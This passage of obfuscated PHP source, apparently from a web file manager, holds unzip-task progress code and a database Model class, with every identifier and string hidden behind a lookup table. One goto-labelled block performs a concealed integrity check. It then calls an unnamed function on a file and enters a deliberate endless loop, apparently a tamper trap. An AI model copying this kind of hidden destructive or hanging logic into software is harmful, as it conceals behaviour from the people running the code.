Cache::get($’¥Ààá, !0); if (!$óêš§Áì || count($óêš§Áì) <= 0) { return; } $ËÌòöîğ = !1; $à¢¨Ü“• = timeFloat(); $ÎŸÑ¡û = array(); foreach ($óêš§Áì as $“ó†ò÷ => $çñ˜½¬Ÿ) { if ($à¢¨Ü“• - $çñ˜½¬Ÿ[$”á–‰û¶[1753]] > $çñ˜½¬Ÿ[$”á–‰û¶[203]]) { $ËÌòöîğ = !0; try { Hook::apply($çñ˜½¬Ÿ[$”á–‰û¶[273]], $çñ˜½¬Ÿ[$”á–‰û¶[1746]]); write_log($”á–‰û¶[1756] . $“ó†ò÷ . $”á–‰û¶[71] . $çñ˜½¬Ÿ[$”á–‰û¶[273]] . $”á–‰û¶[1757] . ACTION, $”á–‰û¶[1748]); } catch (Exception $ĞÏâşª) { } continue; } $ÎŸÑ¡û[$“ó†ò÷] = $çñ˜½¬Ÿ; } if (!$ËÌòöîğ) { return; } if (!$ÎŸÑ¡û) { return Cache::remove($’¥Ààá); } Cache::set($’¥Ààá, $ÎŸÑ¡û, 60); Cache::removeMemory($’¥Ààá); } public static function finished($Ó—¡ãŸ½, $÷«¿¤éŒ) { $²øÍ´ûé =& $_SERVER[™¾ÇÙ¯¹]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($²øÍ´ûé[273] => $Ó—¡ãŸ½, $²øÍ´ûé[1746] => $÷«¿¤éŒ); } private static function finishedRun() { $¾¹¯»å° =& $_SERVER[™¾ÇÙ¯¹]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $•ŞôîÚÀ) { try { Hook::apply($•ŞôîÚÀ[$¾¹¯»å°[273]], $•ŞôîÚÀ[$¾¹¯»å°[1746]]); } catch (Exception $©ÕœÙ‘Ô) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ïá˜ïé² =& $_SERVER[™¾ÇÙ¯¹]; parent::startAfter(); Hook::bind($ïá˜ïé²[1758], array($this, $ïá˜ïé²[1759])); Hook::bind($ïá˜ïé²[1202], array($this, $ïá˜ïé²[1760])); $ŒÒÊÇ§ä =& $this->task; $ŒÒÊÇ§ä[$ïá˜ïé²[1761]] = $ïá˜ïé²[1207]; if (!$ŒÒÊÇ§ä[$ïá˜ïé²[1564]]) { $ŒÒÊÇ§ä[$ïá˜ïé²[1564]] = LNG($ïá˜ïé²[1762]); } } protected function endAfter() { $„¢ØùÆ =& $_SERVER[™¾ÇÙ¯¹]; parent::endAfter(); Hook::unbind($„¢ØùÆ[1758], array($this, $„¢ØùÆ[1759])); Hook::unbind($„¢ØùÆ[1202], array($this, $„¢ØùÆ[1760])); } public function updateAfter() { $äùÏ¸ö =& $_SERVER[™¾ÇÙ¯¹]; $¦ËùïàÈ =& $this->task; if (!$¦ËùïàÈ[$äùÏ¸ö[801]] || !$¦ËùïàÈ[$äùÏ¸ö[778]]) { return; } if ($¦ËùïàÈ[$äùÏ¸ö[1761]] == $äùÏ¸ö[1207]) { $¸¡¹ÓŸö = 0; if ($¦ËùïàÈ[$äùÏ¸ö[1716]]) { $¸¡¹ÓŸö = $¦ËùïàÈ[$äùÏ¸ö[1717]] / $¦ËùïàÈ[$äùÏ¸ö[1716]]; } $¦ËùïàÈ[$äùÏ¸ö[1667]] = $¸¡¹ÓŸö * 0.3; } else { if ($¦ËùïàÈ[$äùÏ¸ö[1761]] == $äùÏ¸ö[322]) { $¸¡¹ÓŸö = $¦ËùïàÈ[$äùÏ¸ö[1666]] / $¦ËùïàÈ[$äùÏ¸ö[801]]; $¦ËùïàÈ[$äùÏ¸ö[1667]] = 0.3 + $¸¡¹ÓŸö * 0.4; } else { if ($¦ËùïàÈ[$äùÏ¸ö[1761]] == $äùÏ¸ö[107]) { $®Û²ïŞ« = 0; if ($¦ËùïàÈ[$äùÏ¸ö[1718]] == $äùÏ¸ö[107]) { $®Û²ïŞ« = $¦ËùïàÈ[$äùÏ¸ö[1717]]; } $¸¡¹ÓŸö = ($¦ËùïàÈ[$äùÏ¸ö[1721]] + $®Û²ïŞ«) / $¦ËùïàÈ[$äùÏ¸ö[778]]; $¦ËùïàÈ[$äùÏ¸ö[1667]] = 0.3 + 0.4 + $¸¡¹ÓŸö * 0.3; } } } if ($¦ËùïàÈ[$äùÏ¸ö[1667]] > 0) { $µ…â„‡ˆ = timeFloat() - $¦ËùïàÈ[$äùÏ¸ö[1669]] - $¦ËùïàÈ[$äùÏ¸ö[1672]]; $¦ËùïàÈ[$äùÏ¸ö[1673]] = $µ…â„‡ˆ * (1 - $¦ËùïàÈ[$äùÏ¸ö[1667]]) / $¦ËùïàÈ[$äùÏ¸ö[1667]]; } } public function addFile($Ê™»„Ö“) { $†Üà£¹Æ =& $_SERVER[™¾ÇÙ¯¹]; $Ú©–‘ªï =& $this->task; $Üáü½´Ş = IO::info($Ê™»„Ö“); $Ú©–‘ªï[$†Üà£¹Æ[1714]] = $Üáü½´Ş[$†Üà£¹Æ[32]]; $Ú©–‘ªï[$†Üà£¹Æ[1716]] = $Üáü½´Ş[$†Üà£¹Æ[76]]; $Ú©–‘ªï[$†Üà£¹Æ[1717]] = 0; $Ú©–‘ªï[$†Üà£¹Æ[1072]] = $†Üà£¹Æ[1737]; $Ú©–‘ªï[$†Üà£¹Æ[1718]] = $†Üà£¹Æ[1207]; $Ú©–‘ªï[$†Üà£¹Æ[778]] = $Üáü½´Ş[$†Üà£¹Æ[76]]; $Ú©–‘ªï[$†Üà£¹Æ[801]] = 1; $Ô¨õîİ” = 0; $Ú©–‘ªï[$†Üà£¹Æ[1725]] = array($†Üà£¹Æ[1726] => $Ô¨õîİ” + 1, $†Üà£¹Æ[428] => $Üáü½´Ş[$†Üà£¹Æ[32]], $†Üà£¹Æ[84] => $Üáü½´Ş[$†Üà£¹Æ[84]], $†Üà£¹Æ[527] => $Üáü½´Ş[$†Üà£¹Æ[527]] ? $Üáü½´Ş[$†Üà£¹Æ[527]] : $Üáü½´Ş[$†Üà£¹Æ[84]]); $this->update(); } public function unzipAfter($ÈŠóÎ…¬) { $£€ï£Çê =& $_SERVER[™¾ÇÙ¯¹]; $¡Î¶Û§é =& $this->task; $¡Î¶Û§é[$£€ï£Çê[1761]] = $£€ï£Çê[107]; $•ŠÛ¯×› = IO::infoWithChildren($ÈŠóÎ…¬); $´ÈèÄÅ… = 0; $¡Î¶Û§é[$£€ï£Çê[1725]] = array($£€ï£Çê[1726] => $´ÈèÄÅ… + 1, $£€ï£Çê[428] => $•ŠÛ¯×›[$£€ï£Çê[32]], $£€ï£Çê[84] => $•ŠÛ¯×›[$£€ï£Çê[84]], $£€ï£Çê[527] => $•ŠÛ¯×›[$£€ï£Çê[527]] ? $•ŠÛ¯×›[$£€ï£Çê[527]] : $•ŠÛ¯×›[$£€ï£Çê[84]]); if ($•ŠÛ¯×›[$£€ï£Çê[33]] == $£€ï£Çê[199]) { $¡Î¶Û§é[$£€ï£Çê[801]] = 1; } else { $¡Î¶Û§é[$£€ï£Çê[801]] = $•ŠÛ¯×›[$£€ï£Çê[79]][$£€ï£Çê[77]]; } $¡Î¶Û§é[$£€ï£Çê[1072]] = $£€ï£Çê[12]; $¡Î¶Û§é[$£€ï£Çê[1718]] = 0; $¡Î¶Û§é[$£€ï£Çê[1666]] = 0; $¡Î¶Û§é[$£€ï£Çê[1716]] = 0; $¡Î¶Û§é[$£€ï£Çê[1717]] = 0; $¡Î¶Û§é[$£€ï£Çê[1714]] = $£€ï£Çê[12]; $¡Î¶Û§é[$£€ï£Çê[1721]] = 0; $¡Î¶Û§é[$£€ï£Çê[778]] = $•ŠÛ¯×›[$£€ï£Çê[76]]; $this->update(); self::log($£€ï£Çê[1763] . json_encode(array($¡Î¶Û§é, $•ŠÛ¯×›))); } public function nameParse($‹„È×œ) { $‚†’üş÷ =& $_SERVER[™¾ÇÙ¯¹]; $§ó×ÁíÉ =& $this->task; if ($§ó×ÁíÉ[$‚†’üş÷[1761]] == $‚†’üş÷[1207]) { $§ó×ÁíÉ[$‚†’üş÷[1761]] = $‚†’üş÷[322]; $§ó×ÁíÉ[$‚†’üş÷[1721]] = 0; $§ó×ÁíÉ[$‚†’üş÷[778]] = 0; } $íƒËø› = get_path_this($‹„È×œ); if (strstr($íƒËø›, $‚†’üş÷[10])) { $§ó×ÁíÉ[$‚†’üş÷[1666]] += 1; $§ó×ÁíÉ[$‚†’üş÷[801]] += 1; } $§ó×ÁíÉ[$‚†’üş÷[1714]] = $‹„È×œ; $this->update(); } } goto aæçÌ©Îíù; a—À§öÚˆ¯: if (!isset($_SERVER[$_SERVER[™¾ÇÙ¯¹][244]]) || !isset($_SERVER[$_SERVER[™¾ÇÙ¯¹][245]])) { $_getc = $_SERVER[™¾ÇÙ¯¹][246]; $_getfile = $_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¾ÇÙ¯¹][231], $_getfilec); if (count($_getarrs) < $_SERVER[™¾ÇÙ¯¹][249]) { $exit = $_SERVER[™¾ÇÙ¯¹][250]; $exit(); } $_act = $_SERVER[™¾ÇÙ¯¹][251]; $_act($_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[™¾ÇÙ¯¹][252]); } } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\157\x72\144\145\x72", "\141\x6c\x69\x61\x73", "\x68\x61\x76\x69\156\x67", "\147\162\x6f\165\x70", "\x6c\157\x63\153", "\x64\x69\163\164\151\x6e\143\164", "\x61\x75\x74\157", "\146\x69\154\x74\x65\x72", "\x76\141\x6c\x69\144\x61\x74\x65", "\162\145\x73\x75\154\x74", "\x62\151\x6e\144", "\x74\x6f\x6b\145\156"); public function __construct($†ƒ¤¨¤ = '', $à óª¥§ = '', $–ß¯Ô‡ú = '') { $¡¶€é„Í =& $_SERVER[™¾ÇÙ¯¹]; $this->_initialize(); if (!empty($†ƒ¤¨¤)) { if (strpos($†ƒ¤¨¤, $¡¶€é„Í[10])) { list($this->dbName, $this->name) = explode($¡¶€é„Í[10], $†ƒ¤¨¤); } else { $this->name = $†ƒ¤¨¤; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($à óª¥§)) { $this->tablePrefix = $¡¶€é„Í[12]; } elseif ($¡¶€é„Í[12] != $à óª¥§) { $this->tablePrefix = $à óª¥§; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¡¶€é„Í[253]); } $this->db(0, empty($this->connection) ? $–ß¯Ô‡ú : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ïˆ®çüÀ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($this->fields)) { if (think_config($ïˆ®çüÀ[254])) { $î©Ûè¬ù = $this->dbName ? $this->dbName : think_config($ïˆ®çüÀ[255]); $¥îß²ú = think_var_cache($ïˆ®çüÀ[256] . strtolower(get_path_this($î©Ûè¬ù) . $ïˆ®çüÀ[10] . $this->name)); if ($¥îß²ú) { $Æ¤¸Ü¤’ = think_config($ïˆ®çüÀ[257]); if (empty($Æ¤¸Ü¤’) || $¥îß²ú[$ïˆ®çüÀ[258]] == $Æ¤¸Ü¤’) { $this->fields = $¥îß²ú; return; } } } $this->flush(); } } public function flush() { $¥‰ü† Ü =& $_SERVER[™¾ÇÙ¯¹]; $this->db->setModel($this->name); $ØÆ¸Ï€ò = $this->db->getFields($this->getTableName()); if (!$ØÆ¸Ï€ò) { return !1; } $this->fields = array_keys($ØÆ¸Ï€ò); $this->fields[$¥‰ü† Ü[259]] = !1; foreach ($ØÆ¸Ï€ò as $Ú¹÷–ã™ => $é¼Óßí) { $¤½àñï[$Ú¹÷–ã™] = $é¼Óßí[$¥‰ü† Ü[33]]; if ($é¼Óßí[$¥‰ü† Ü[39]]) { $this->fields[$¥‰ü† Ü[260]] = $Ú¹÷–ã™; if ($é¼Óßí[$¥‰ü† Ü[42]]) { $this->fields[$¥‰ü† Ü[259]] = !0; } } } $this->fields[$¥‰ü† Ü[261]] = $¤½àñï; if (think_config($¥‰ü† Ü[257])) { $this->fields[$¥‰ü† Ü[258]] = think_config($¥‰ü† Ü[257]); } if (think_config($¥‰ü† Ü[254])) { $“ø£¨Ê™ = $this->dbName ? $this->dbName : think_config($¥‰ü† Ü[255]); think_var_cache($¥‰ü† Ü[256] . strtolower(get_path_this($“ø£¨Ê™) . $¥‰ü† Ü[10] . $this->name), $this->fields); } } public function switchModel($›×ü“õ­, $È»ò´¤½ = array()) { $ûê·±á =& $_SERVER[™¾ÇÙ¯¹]; $úóÆîü‡ = ucwords(strtolower($›×ü“õ­)) . $ûê·±á[262]; if (!class_exists($úóÆîü‡)) { think_exception($úóÆîü‡ . think_lang($ûê·±á[263])); } $this->_extModel = new $úóÆîü‡($this->name); if (!empty($È»ò´¤½)) { foreach ($È»ò´¤½ as $İ×Ë×’Ì) { $this->_extModel->setProperty($İ×Ë×’Ì, $this->{$İ×Ë×’Ì}); } } return $this->_extModel; } public function __set($ÜƒÖô“Ê, $À÷ë¶ôˆ) { $this->data[$ÜƒÖô“Ê] = $À÷ë¶ôˆ; } public function __get($†¶¹…ú) { return isset($this->data[$†¶¹…ú]) ? $this->data[$†¶¹…ú] : null; } public function __isset($†—‰µº“) { return isset($this->data[$†—‰µº“]); } public function __unset($×ÎİÙ™) { unset($this->data[$×ÎİÙ™]); } public function __call($•«‚÷õå, $å’ÌŒÌÄ) { $˜Úãš° =& $_SERVER[™¾ÇÙ¯¹]; if (in_array(strtolower($•«‚÷õå), $this->methods, !0)) { $this->options[strtolower($•«‚÷õå)] = $å’ÌŒÌÄ[0]; return $this; } elseif (in_array(strtolower($•«‚÷õå), array($˜Úãš°[264], $˜Úãš°[265], $˜Úãš°[266], $˜Úãš°[267], $˜Úãš°[268]), !0)) { $ÌØˆ¹” = isset($å’ÌŒÌÄ[0]) ? $å’ÌŒÌÄ[0] : $˜Úãš°[188]; $ÌØˆ¹” = $this->db->parseKey($ÌØˆ¹”); return $this->getField(strtoupper($•«‚÷õå) . $˜Úãš°[269] . $ÌØˆ¹” . $˜Úãš°[270] . $•«‚÷õå, $˜Úãš°[264]); } elseif (strtolower(substr($•«‚÷õå, 0, 5)) == $˜Úãš°[271]) { $ÌØˆ¹” = think_parse_name(substr($•«‚÷õå, 5)); $—¶èıå«[$ÌØˆ¹”] = $å’ÌŒÌÄ[0]; return $this->where($—¶èıå«)->find(); } elseif (strtolower(substr($•«‚÷õå, 0, 10)) == $˜Úãš°[272]) { $ÒÌœöÅò = think_parse_name(substr($•«‚÷õå, 10)); $—¶èıå«[$ÒÌœöÅò] = $å’ÌŒÌÄ[0]; return $this->where($—¶èıå«)->getField($å’ÌŒÌÄ[1]); } elseif (isset($this->_scope[$•«‚÷õå])) { return $this->scope($•«‚÷õå, $å’ÌŒÌÄ[0]); } elseif (method_exists($this, $•«‚÷õå)) { array_unshift($å’ÌŒÌÄ, $•«‚÷õå); return call_user_func_array(array($this, $˜Úãš°[273]), $å’ÌŒÌÄ); } else { return call_user_func_array(array(parent, $•«‚÷õå), $å’ÌŒÌÄ); } } protected function call() { $Öğº”Ã =& $_SERVER[™¾ÇÙ¯¹]; $¼ïÔ‚§“ = func_get_args(); $³¨ò´†Ø = array_shift($¼ïÔ‚§“); $èë²Ñ¢ø = $³¨ò´†Ø; if (is_array($³¨ò´†Ø)) { $èë²Ñ¢ø = $³¨ò´†Ø[1]; $³¨ò´†Ø = $³¨ò´†Ø[0]; } $ƒœ¿œ¢‹ = count($¼ïÔ‚§“) - 1; if (isset($¼ïÔ‚§“[$ƒœ¿œ¢‹]) && $¼ïÔ‚§“[$ƒœ¿œ¢‹] === $³¨ò´†Ø) { think_exception(__CLASS__ . $Öğº”Ã[4] . $³¨ò´†Ø . think_lang($Öğº”Ã[274])); return; } $¼ïÔ‚§“[] = $³¨ò´†Ø; if (method_exists($this, $Öğº”Ã[275])) { $¶ËÑÉûÎ = call_user_func_array(array($this, $Öğº”Ã[276]), array($èë²Ñ¢ø, $¼ïÔ‚§“)); if (!is_null($¶ËÑÉûÎ) && $¶ËÑÉûÎ !== !1) { return $¶ËÑÉûÎ; } } $¬ù•”Ñä = call_user_func_array(array($this, $³¨ò´†Ø), $¼ïÔ‚§“); if (method_exists($this, $Öğº”Ã[277])) { $¶ËÑÉûÎ = call_user_func_array(array($this, $Öğº”Ã[278]), array($èë²Ñ¢ø, $¼ïÔ‚§“, $¬ù•”Ñä)); if ($¶ËÑÉûÎ) { return $¶ËÑÉûÎ; } } return $¬ù•”Ñä; } protected function _initialize() { } protected function _facade($Õ¬§Áşæ) { $ŸÑ®¤ =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($this->fields)) { foreach ($Õ¬§Áşæ as $¹òÁÁ» => $‡ÚÖí¡Ì) { if (is_array($this->fields) && !in_array($¹òÁÁ», $this->fields, !0)) { unset($Õ¬§Áşæ[$¹òÁÁ»]); } elseif (is_scalar($‡ÚÖí¡Ì)) { $this->_parseType($Õ¬§Áşæ, $¹òÁÁ»); } } } if (!empty($this->options[$ŸÑ®¤[279]])) { $Õ¬§Áşæ = array_map($this->options[$ŸÑ®¤[279]], $Õ¬§Áşæ); unset($this->options[$ŸÑ®¤[279]]); } $this->_beforeWrite($Õ¬§Áşæ); return $Õ¬§Áşæ; } protected function _beforeWrite(&$‡…¤¡¯ô) { } public function add($ıĞı†—ú = '', $¡ç§˜œ = array(), $ëàü”éÛ = false) { if (empty($ıĞı†—ú)) { if (!empty($this->data)) { $ıĞı†—ú = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[™¾ÇÙ¯¹][280]); return !1; } } $¡ç§˜œ = $this->_parseOptions($¡ç§˜œ); $ıĞı†—ú = $this->_facade($ıĞı†—ú); if (!1 === $this->_beforeInsert($ıĞı†—ú, $¡ç§˜œ)) { return !1; } $ßù«à²´ = $this->db->insert($ıĞı†—ú, $¡ç§˜œ, $ëàü”éÛ); if (!1 !== $ßù«à²´) { $ƒ— •Ñ = $this->getLastInsID(); if ($ƒ— •Ñ) { $ıĞı†—ú[$this->getPk()] = $ƒ— •Ñ; $this->_after_insert($ıĞı†—ú, $¡ç§˜œ); return $ƒ— •Ñ; } $this->_after_insert($ıĞı†—ú, $¡ç§˜œ); } return $ßù«à²´; } protected function _beforeInsert(&$œÊ˜ü¢ê, $ƒèû¶ûü) { } protected function _after_insert($Äú•ŸƒÜ, $´Œ´ù¡ã) { } public function addAll($†ÏÌ·’ª, $¤—½¸ö¨ = array(), $£ë¾²‘ß = false) { $²Œ•’Ùª =& $_SERVER[™¾ÇÙ¯¹]; if (empty($†ÏÌ·’ª)) { $this->error = think_lang($²Œ•’Ùª[280]); return !1; } $¤—½¸ö¨ = $this->_parseOptions($¤—½¸ö¨); foreach ($†ÏÌ·’ª as $üÕœ«ª => $ş–¾è’ˆ) { $†ÏÌ·’ª[$üÕœ«ª] = $this->_facade($ş–¾è’ˆ); } if (method_exists($this->db, $²Œ•’Ùª[281])) { $Ëšİ‹¹ = $this->db->insertAll($†ÏÌ·’ª, $¤—½¸ö¨, $£ë¾²‘ß); } else { $this->startTrans(); foreach ($†ÏÌ·’ª as $üÕœ«ª => $ş–¾è’ˆ) { $Ëšİ‹¹ = $this->db->insert($ş–¾è’ˆ, $¤—½¸ö¨, $£ë¾²‘ß); } $this->commit(); } if (!1 !== $Ëšİ‹¹) { $Ó”ú«Ò· = $this->getLastInsID(); if ($Ó”ú«Ò·) { return $Ó”ú«Ò·; } } return $Ëšİ‹¹; } public function selectAdd($å•Ğª = '', $¦¯‚Éº = '', $è³ –¶Ğ = array()) { $‹»‹ó’ˆ =& $_SERVER[™¾ÇÙ¯¹]; $è³ –¶Ğ = $this->_parseOptions($è³ –¶Ğ); if (!1 === ($Ê™â¤Á£ = $this->db->selectInsert($å•Ğª ? $å•Ğª : $è³ –¶Ğ[$‹»‹ó’ˆ[282]], $¦¯‚Éº ? $¦¯‚Éº : $this->getTableName(), $è³ –¶Ğ))) { $this->error = think_lang($‹»‹ó’ˆ[283]); return !1; } else { return $Ê™â¤Á£; } } public function save($âéİ‘Å = '', $Í†òçÅ‰ = array()) { $­´ù‰¤ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($âéİ‘Å)) { if (!empty($this->data)) { $âéİ‘Å = $this->data; $this->data = array(); } else { $this->error = think_lang($­´ù‰¤[280]); return !1; } } $âéİ‘Å = $this->_facade($âéİ‘Å); $Í†òçÅ‰ = $this->_parseOptions($Í†òçÅ‰); $Í‘Ã”ó = $this->getPk(); if (!isset($Í†òçÅ‰[$­´ù‰¤[284]])) { if (isset($âéİ‘Å[$Í‘Ã”ó])) { $›­ıùÈŸ[$Í‘Ã”ó] = $âéİ‘Å[$Í‘Ã”ó]; $Í†òçÅ‰[$­´ù‰¤[284]] = $›­ıùÈŸ; unset($âéİ‘Å[$Í‘Ã”ó]); } else { $this->error = think_lang($­´ù‰¤[283]); return !1; } } if (is_array($Í†òçÅ‰[$­´ù‰¤[284]]) && isset($Í†òçÅ‰[$­´ù‰¤[284]][$Í‘Ã”ó])) { $ã¥å¡£î = $Í†òçÅ‰[$­´ù‰¤[284]][$Í‘Ã”ó]; } if (!1 === $this->_beforeUpdate($âéİ‘Å, $Í†òçÅ‰)) { return !1; } $âÂ¡³û = $this->db->update($âéİ‘Å, $Í†òçÅ‰); if (!1 !== $âÂ¡³û) { if (isset($ã¥å¡£î)) { $âéİ‘Å[$Í‘Ã”ó] = $ã¥å¡£î; } $this->_afterUpdate($âéİ‘Å, $Í†òçÅ‰); } return $âÂ¡³û; } protected function _beforeUpdate(&$¹§ËëÓà, $Ô£®òà²) { } protected function _afterUpdate($¸æ°ñæû, $´Á£‘ĞÈ) { } public function delete($¨ÓÕıÆ˜ = array()) { $şÊ§®Œ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($¨ÓÕıÆ˜) && empty($this->options[$şÊ§®Œ[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $öÉíöñ = $this->getPk(); if (is_numeric($¨ÓÕıÆ˜) || is_string($¨ÓÕıÆ˜)) { if (strpos($¨ÓÕıÆ˜, $şÊ§®Œ[50])) { $Ãş­¦úˆ[$öÉíöñ] = array($şÊ§®Œ[285], $¨ÓÕıÆ˜); } else { $Ãş­¦úˆ[$öÉíöñ] = $¨ÓÕıÆ˜; } $this->options[$şÊ§®Œ[284]] = $Ãş­¦úˆ; } $¨ÓÕıÆ˜ = $this->_parseOptions(); if (is_array($¨ÓÕıÆ˜[$şÊ§®Œ[284]]) && isset($¨ÓÕıÆ˜[$şÊ§®Œ[284]][$öÉíöñ])) { $™¸¯¯§Ù = $¨ÓÕıÆ˜[$şÊ§®Œ[284]][$öÉíöñ]; } $í›×„ÆÃ = $this->db->delete($¨ÓÕıÆ˜); if (!1 !== $í›×„ÆÃ) { $éíœĞüÛ = array(); if (isset($™¸¯¯§Ù)) { $éíœĞüÛ[$öÉíöñ] = $™¸¯¯§Ù; } $this->_after_delete($éíœĞüÛ, $¨ÓÕıÆ˜); } return $í›×„ÆÃ; } protected function _after_delete($—àëÂôé, $ŠØ÷ »¤) { } public function select($åÏÒÑıù = array()) { $·é£…Îì =& $_SERVER[™¾ÇÙ¯¹]; if (is_string($åÏÒÑıù) || is_numeric($åÏÒÑıù)) { $‚ğù¹Ç = $this->getPk(); if (strpos($åÏÒÑıù, $·é£…Îì[50])) { $ö¡¨“éµ[$‚ğù¹Ç] = array($·é£…Îì[285], $åÏÒÑıù); } else { $ö¡¨“éµ[$‚ğù¹Ç] = $åÏÒÑıù; } $this->options[$·é£…Îì[284]] = $ö¡¨“éµ; } elseif (!1 === $åÏÒÑıù) { $åÏÒÑıù = $this->_parseOptions(); return $·é£…Îì[286] . $this->db->buildSelectSql($åÏÒÑıù) . $·é£…Îì[287]; } $åÏÒÑıù = $this->_parseOptions(); $Ûö’óşğ = $this->db->select($åÏÒÑıù); if (!1 === $Ûö’óşğ) { return !1; } if (empty($Ûö’óşğ)) { return null; } $this->_afterSelect($Ûö’óşğ, $åÏÒÑıù); return $Ûö’óşğ; } protected function _afterSelect(&$¿‡•¸Ş, $ÖúªüĞø) { } public function buildSql($ˆ÷ŞÎŞ¸ = array()) { $ì†ã¹ûş =& $_SERVER[™¾ÇÙ¯¹]; $ˆ÷ŞÎŞ¸ = $this->_parseOptions($ˆ÷ŞÎŞ¸); return $ì†ã¹ûş[286] . $this->db->buildSelectSql($ˆ÷ŞÎŞ¸) . $ì†ã¹ûş[287]; } public function optionsValue($Äù³Ğğû = null) { if (is_null($Äù³Ğğû)) { return $this->options; } elseif (is_array($Äù³Ğğû)) { $this->options = array_merge($this->options, $Äù³Ğğû); } } protected function _parseOptions($ŒœóÏé = array()) { $ëÙ´Àš =& $_SERVER[™¾ÇÙ¯¹]; if (is_array($ŒœóÏé)) { $ŒœóÏé = array_merge($this->options, $ŒœóÏé); } $this->options = array(); if (!isset($ŒœóÏé[$ëÙ´Àš[288]])) { $ŒœóÏé[$ëÙ´Àš[288]] = $this->getTableName(); $ªŠÀ¥é÷ = $this->fields; } else { $ªŠÀ¥é÷ = $this->getDbFields(); } if (!empty($ŒœóÏé[$ëÙ´Àš[289]])) { $ŒœóÏé[$ëÙ´Àš[288]] .= $ëÙ´Àš[53] . $ŒœóÏé[$ëÙ´Àš[289]]; } $ŒœóÏé[$ëÙ´Àš[290]] = $this->name; if (isset($ŒœóÏé[$ëÙ´Àš[284]]) && is_array($ŒœóÏé[$ëÙ´Àš[284]]) && !empty($ªŠÀ¥é÷) && !isset($ŒœóÏé[$ëÙ´Àš[291]]) && !isset($ŒœóÏé[$ëÙ´Àš[288]])) { foreach ($ŒœóÏé[$ëÙ´Àš[284]] as $ƒ–ûóÊ£ => $ˆÃ±¶ÁÉ) { $ƒ–ûóÊ£ = trim($ƒ–ûóÊ£); if (in_array($ƒ–ûóÊ£, $ªŠÀ¥é÷, !0)) { if (is_scalar($ˆÃ±¶ÁÉ)) { $this->_parseType($ŒœóÏé[$ëÙ´Àš[284]], $ƒ–ûóÊ£); } } elseif (!is_numeric($ƒ–ûóÊ£) && $ëÙ´Àš[11] != substr($ƒ–ûóÊ£, 0, 1) && !1 === strpos($ƒ–ûóÊ£, $ëÙ´Àš[10]) && !1 === strpos($ƒ–ûóÊ£, $ëÙ´Àš[269]) && !1 === strpos($ƒ–ûóÊ£, $ëÙ´Àš[292]) && !1 === strpos($ƒ–ûóÊ£, $ëÙ´Àš[293])) { unset($ŒœóÏé[$ëÙ´Àš[284]][$ƒ–ûóÊ£]); } } } $this->_options_filter($ŒœóÏé); return $ŒœóÏé; } protected function _options_filter(&$ù€ğ¡æê) { } protected function _parseType(&$û†Í¿™ö, $¿¢ØœÛÖ) { $”šâİÂó =& $_SERVER[™¾ÇÙ¯¹]; if (empty($this->options[$”šâİÂó[294]][$”šâİÂó[4] . $¿¢ØœÛÖ])) { $Ô§˜—ÇĞ = strtolower($this->fields[$”šâİÂó[261]][$¿¢ØœÛÖ]); if (!1 !== strpos($Ô§˜—ÇĞ, $”šâİÂó[295])) { } elseif (!1 === strpos($Ô§˜—ÇĞ, $”šâİÂó[296]) && !1 !== strpos($Ô§˜—ÇĞ, $”šâİÂó[297])) { $û†Í¿™ö[$¿¢ØœÛÖ] = intval($û†Í¿™ö[$¿¢ØœÛÖ]); } elseif (!1 !== strpos($Ô§˜—ÇĞ, $”šâİÂó[298]) || !1 !== strpos($Ô§˜—ÇĞ, $”šâİÂó[299])) { $û†Í¿™ö[$¿¢ØœÛÖ] = floatval($û†Í¿™ö[$¿¢ØœÛÖ]); } elseif (!1 !== strpos($Ô§˜—ÇĞ, $”šâİÂó[300])) { $û†Í¿™ö[$¿¢ØœÛÖ] = (bool) $û†Í¿™ö[$¿¢ØœÛÖ]; } } } public function find($„óØÌÚñ = array()) { $¡ó‚Ÿ˜ä =& $_SERVER[™¾ÇÙ¯¹]; if (is_numeric($„óØÌÚñ) || is_string($„óØÌÚñ)) { $»şÆ©Œ¦[$this->getPk()] = intval($„óØÌÚñ); $this->options[$¡ó‚Ÿ˜ä[284]] = $»şÆ©Œ¦; } $this->options[$¡ó‚Ÿ˜ä[301]] = 1; $„óØÌÚñ = $this->_parseOptions(); $¹£ İÏ = $this->db->select($„óØÌÚñ); if (!1 === $¹£ İÏ) { return !1; } if (empty($¹£ İÏ)) { return null; } $this->data = $¹£ İÏ[0]; $this->_afterFind($this->data, $„óØÌÚñ); if (!empty($this->options[$¡ó‚Ÿ˜ä[302]])) { return $this->returnResult($this->data, $this->options[$¡ó‚Ÿ˜ä[302]]); } return $this->data; } protected function _afterFind(&$…¯’Ö†Ï, $ãç¬‡ ı) { } protected function returnResult($Ä±èˆŒ, $úŒ¼¢À = '') { $£ö¡¿‘æ =& $_SERVER[™¾ÇÙ¯¹]; if ($úŒ¼¢À) { if (is_callable($úŒ¼¢À)) { return call_user_func($úŒ¼¢À, $Ä±èˆŒ); } switch (strtolower($úŒ¼¢À)) { case $£ö¡¿‘æ[303]: return json_encode($Ä±èˆŒ); case 